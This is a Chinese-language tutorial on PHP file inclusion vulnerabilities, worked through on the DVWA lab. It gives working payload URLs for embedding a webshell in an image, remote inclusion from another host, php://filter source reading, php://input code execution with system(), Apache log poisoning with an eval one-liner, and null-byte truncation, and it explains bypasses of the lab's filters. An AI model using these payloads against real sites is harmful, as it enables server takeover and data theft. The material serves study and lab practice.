#文件包含类
<br>
*在PHP程序中出现较多，其他的较少

##文件包含漏洞分类及上传技巧

* 包含漏洞简介：<br>
  包含操作，在大多数web语言中都会提供的功能（比如包含一些跨站、防注入程序等），但PHP对于包含文件所提供的功能太强大、灵活，所以包含漏洞经常出现在PHP语言中，这也就导致出现了一个错误现状，很多初学者认为包含漏洞只出现在PHP语言之中，殊不知在其他语言中可能出现包含漏洞。这也应了一句老话：功能越强大，漏洞就越多。

*  PHP包含漏洞分类<br>
   包含漏洞不是语言的问题，而是人的思维问题！<br>
   PHP中的四个包含文件函数：include() , include_once() , require() 和 require_once() （在源码审计中，一定要留心有没有这四个函数，有的话过滤是不是严格有没有漏洞）。<br>
   下面我们一起来看PHP文件中的包含：
   + 1、本地包含LIF（一般）
   + 2、远程包含RLF，必须要PHP的配置文件PHP.XXX中有allow_url_include = on

###0X00 PHP本包含实例<br>
   * 当任何文件上传成功后，被以上四种PHP包含函数包含后，无论是什么文件格式，都会以PHP格式解析。所以如果在文件中插了木马，这个时候就很危险了。

###0X01 本地包含漏洞与图片结合<br>
   1. 将木马程序加载到图片里面去:
	   + 打开一张正常图片
	   + 随便找一个木马
	   + 使用edjpgcom.exe软件将木马插入到图片中
   2. 将图片上传，一般网站都不会拦截（此时图片还是可以正常打开的）
   3. 通过存在包含漏洞的页面来包含刚上传带一句话木马的图片
   4. ！！！【一定要注意相对路径】，page=../../hackable/uploads/test.jpg

###0X02 PHP远程包含实例
   1. 首先打开C:\php\php-5.2.14-win32\php-apache2handler.ini文件（大家的文件路径不一定是这个，大家一般的路径是php.ini），找到allow_url_include = off这一行，【把off改成on】
   2. 然后找到存在包含漏洞的页面，将包含函数的参数改为远程的一个页面（远程地址），如page = http://192.168.1.103:8080/index.asp，能看到直接运行起来了。如果index.asp是一个木马呢或者是一个php的木马页面呢？是不是也能运行起来，很危险了吧。



##文件包含读写文件

###0X03 PHP包含读文件
* 如： http://192.168.2.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php , 访问URL，得到经过base64加密后的字符串。经解密还原即可得到x.php。
* 【page(参数)=php://filter/read=convert.base64-encode/resource=xXX.php】有时候需要将read变成大写Read来绕过一些过滤，如sctf的homework
* http的内置协议是php协议php://filter
* 【条件】：一定要有GET传入 $_GET

###0X04 PHP包含写文件
*  构造URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input ， 并且提交post数据为<?php system('netuser');?>?????【即自己要写入的内容】
*  ！！【注意】：只有allow_url_include为on的时候才可以使用，如果想查看回显结果那必须在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini打开，查找dispaly_funtions=proc-open,oppen.exec.system......（这些都是危险的命令，一定不要打开。因为一般写web程序用不到这些命令，建议直接删掉）删掉sysytem重启Apache。

###0X05 PHP包含日志文件
* 当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味着有包含漏洞却不能拿来利用，这时攻击者就有可能会利用Apache日志文件来入侵。
* Apache服务器运行后会生成两个日志文件，这两个文件是access.log（访问日志）和（错误日志），Apache的日志文件记录下我们的任何操作，并且写到访问日志文件access.log之中（时间、IP地址）
* 当没有开启远程包含、文件上传时，只能通过包含日志文件了<br>
  (必须要知道当前网页路径和日志的默认路径，然后来构造)
  1. 先在网址后面接/php<?php eval一句话木马?>访问，日志access.log会记录这一行为
  2. 包含日志文件access.log。【这一步必须要知道当前网页路径和日志的默认路径，然后来构造】
     + 构造：http://......./fi/?page=../../../../Apache-20/logs/access.log
     + 确保当前网站目录的../../../../的最终目录与Apache-20文件夹在一个目录下。
   3. 访问，看到页面上出现一句话木马。菜刀链接即可。

###0X06 截断包含
* 
```
<?php
   if(isset($_GET['page'])){
      include $_GET['page'].".php";
   }else{
      include 'home.php';
   }
?>
```
* 这种方法只适合magic quotes gpc=off的时候，在PHP的老版本中也是存在着一些其他的截断问题，不过现在已经很难见到了，比如：index.php?file=info.txt////......超过一定数据的/。
* 例如： ....../?page=1.jpg%00即可

###0X07 PHP内置协议
* PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数
* 具体协议请参照http://www.php.net/manual/zh/wrappers.php
* 图片1

###0X08 PHP远程包含防御
* 以DVWN-File Inclusion为例，安全级别低中高
  + low:

    ```
    <?php $file = $_GET['page']; //The page we wish to display ?>
    ```
  + Medeium:

    ```
    <? php
       $file = $_GET['page']; //The page we wish to display
       //bad input validation
       $file = str_replace("http://"," ", $file); //在传入的$file中搜索http://，替换成空格后，重新赋给$file
       $file = str_replace("https://"," ", $file); // 易绕过，函数str_replace区分大小写，一旦大写等于没做防御
    ?>
   + High:

     ```
     <? php
        $file = $_GET['page']; //The page we wish to display 
        //Only allow include.php
        if ($file != "include.php"){
           echo "ERROR: File not found";
           exit;
        }
      ?>

###运用实例：
* 从网上下载copyright2007-2011 易酷CMS Some Rights Reserved版本到本地测试
* 漏洞利用过程（包含日志文件）： http://www.wooyun.org/bugs/wooyun-2010-061639
* 在本地模拟这些实验